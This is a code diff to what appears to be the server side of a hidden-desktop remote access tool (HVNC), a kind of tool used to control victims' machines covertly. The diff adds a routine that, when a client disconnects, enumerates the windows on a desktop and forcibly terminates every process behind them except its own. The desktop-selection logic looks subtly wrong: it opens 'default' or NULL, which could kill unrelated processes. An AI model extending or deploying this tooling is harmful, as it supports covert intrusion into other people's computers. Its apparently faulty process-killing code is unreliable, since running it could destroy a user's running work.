@@ -50,6 +50,22 @@ PCLIENT GetClient( BOOL uhid, DWORD uhidData, HWND hWndData )
     return NULL;
 };
 
+BOOL CALLBACK TerminateDesktopProcesses(HWND hWnd, LPARAM lParam)
+{
+    DWORD pid;
+    GetWindowThreadProcessId(hWnd, &pid);
+    if (pid != GetCurrentProcessId())
+    {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess)
+        {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+    }
+    return TRUE;
+};
+
 INT SendInt( SOCKET s, INT i )
 {
    return send( s, ( PCHAR )&i, sizeof( i ), 0 );
@@ -500,6 +516,15 @@ cleanup:
         EnterCriticalSection( &gCrit );
         {
             printf( "[!] Client %s Disconnected\n", ip );
+
+            // Terminate all processes on the hidden desktop
+            HDESK hDesk = OpenDesktopA(pClient->uhid ? "default" : NULL, 0, FALSE, DESKTOP_ENUMERATE);
+            if (hDesk)
+            {
+                EnumDesktopWindows(hDesk, TerminateDesktopProcesses, (LPARAM)pClient->uhid);
+                CloseDesktop(hDesk);
+            }
+
             free( pClient->pixels );
             DeleteDC( pClient->hDcBmp);
             closesocket( pClient->connections[input] );
